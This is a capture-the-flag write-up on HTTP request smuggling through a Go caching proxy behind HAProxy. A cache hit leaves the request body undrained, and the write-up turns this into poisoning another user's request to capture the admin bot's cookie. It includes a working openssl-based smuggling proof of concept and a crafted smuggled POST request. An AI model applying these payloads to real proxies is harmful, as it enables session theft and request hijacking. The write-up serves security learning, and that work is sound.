# Crossing Boundaries Challenge

🧑‍🍳 Chef's kiss

## TL;DR
This challenge exploits a request boundary desynchronization caused by a bug in a custom Go caching proxy.
When a cache hit occurs, the proxy does not fully drain the request body, yet keeps the backend connection alive.
Because HAProxy reuses connections, leftover bytes are interpreted as the next request, enabling request smuggling and cross-user request poisoning.

## Given files
- Partial source code
- Hint: If a GET request is answered early, body data doesn’t get drained.
- Hint: Can you poison the admin bot request into something you control and hence see the admin cookie?

## Architecture
(obseravable from the docker-compose file)
```
Client → HAProxy → Go Caching Proxy → Backend Server
```

Key properties:
- HAProxy reuses HTTP/1.1 connections (keep-alive).
- The Go proxy implements a response cache.
- On a cache hit, the proxy returns the cached response early.
- Bug: the proxy does not consume the full request body before returning.

## Core Bug
The Go caching proxy violates a core HTTP invariant:
> A proxy must fully consume the request body before reusing the connection.

On a cache hit:
- The proxy sends a cached response upstream.
- The remaining request body bytes stay unread on the TCP stream.
- The backend connection is reused.
- Those unread bytes become attacker-controlled input for the next request on the same connection.
- This is not a header-parsing bug — it is a stream desynchronization bug.

## Testing it out
- On Cache HIT, `proxy/main.go` forgets to drain the body
- Testing it out
```sh
pubbid=b3919dba-c247-456f-9543-aae9cfe34d53
host=crossing-boundaries.ctf.prgy.in
port=443
cookie="Cookie: session=6922edb2-586f-4ac7-9ed8-9c2dc187915e"
smuggled="GET /flag HTTP/1.1\r\nX-Ignore: a"
payload="GET /blogs/$pubbid HTTP/1.1\r\nHost: $host\r\n$cookie\r\nContent-Length: 100\r\n\r\n$smuggled"
# content length greater than the smuggled payload length
# the next incoming gets prefixed with the smuggled payload
# go to the browser and refresh a random page, it should give the /flag response with 401 instead of the actual page or bad request or misbehave

echo -n "$payload" | openssl s_client -connect $host:$port -quiet 2>/dev/null &
```
- the above script confirms the presence of the request smuggling vulnerability

## Exploitation
The bad thing about this payload is that, there's no reflection.
The blog creation feature can be used to convert the admin bot's request into a blog post by prefixing the admin bot's request.
Here's the idea:
```
GET /blogs/{cached_id} HTTP/1.1
Content-Length: X

[smuggled HTTP request]
```

The smuggled request is crafted to look like:

```
POST /my-blogs/create HTTP/1.1
Content-Length: N
Content-Type: x-www-form-urlencoded

content=[future victim request bytes]
```

When a victim (or admin bot) later sends a request (and if the haproxy reuses the same connection):
- The backend treats the victim’s request as the body of the attacker’s smuggled request.
- The attacker effectively moves the victim request into the body of a request they control.

We can first send a request to the admin bot to trigger the review process.
Then within the 10s window, we can send our payload to capture the admin cookie in the blog.


## Actual working payload
checkout ./solve2.sh
